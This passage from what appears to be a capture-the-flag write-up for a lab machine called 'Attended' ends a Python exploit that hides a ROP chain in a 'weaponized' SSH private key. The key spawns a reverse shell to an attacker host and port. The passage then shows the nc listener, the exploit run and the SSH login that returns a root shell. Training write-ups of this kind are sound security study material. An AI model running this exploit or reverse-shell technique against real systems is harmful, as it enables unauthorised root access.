+          buf += p64(rop['shr'])
+          buf += p64(rop['not'])
+          buf += p64(rop['shr'])
+          buf += p64(rop['shr'])
+          buf += p64(rop['shr'])
+          buf += p64(rop['not'])
+          buf += p64(rop['shr'])
+          buf += p64(rop['shr'])
+
+          # RDI: cmd pointer
+          buf += p64(rop['movss'])
+          buf += p64(rop['cvtss2si'])
+          buf += p64(rop['movrdirsi_poprdx'])
+
+          # RSI: arg pointer
+          buf += p64(baseaddr + fp_offset + 0x08)
+          buf += p64(rop['movss'])
+          buf += p64(rop['cvtss2si'])
+
+          # RDX: NULL
+          buf += p64(rop['poprdx'])
+          buf += p64(0x0)
+
+          # System call
+          buf += p64(rop['syscall'])
+
+          return buf
+
+   def main():
+          parser = argparse.ArgumentParser()
+          parser.add_argument("lhost", help="Local host for reverse shell")
+          parser.add_argument("lport", help="Local port for reverse shell")
+          args = parser.parse_args()
+
+          key = priv_key("basekey")
+          rop = gen_rop(args.lhost, args.lport)
+          weaponized_key = add_rop(key, rop)
+          print(weaponized_key.replace('\\n','\n'))
+
+   if __name__ == '__main__':
+          main()
+
+We open a listener on port 7777:
+   nc -lnvp 7777
+Finally, we run the script:
+
+   ./exploit.py 10.10.14.30 7777 --offset 8
+A weaponized key is generated and printed to standard output:
+
+We copy it and paste it to a file called safe_key on the target host. We set the right permissions on this file
+( 600 ) and then attempt opening an SSH session to attendedgw (192.168.23.1) as the user guly passing
+safe_key as our private key:
+
+   chmod 600 safe_key
+   attended$ ssh -i safe_key -p 2222 guly@192.168.23.1
+A reverse shell with root privileges is promptly received:
+
+The root flag can be found in /root/root.txt .
+
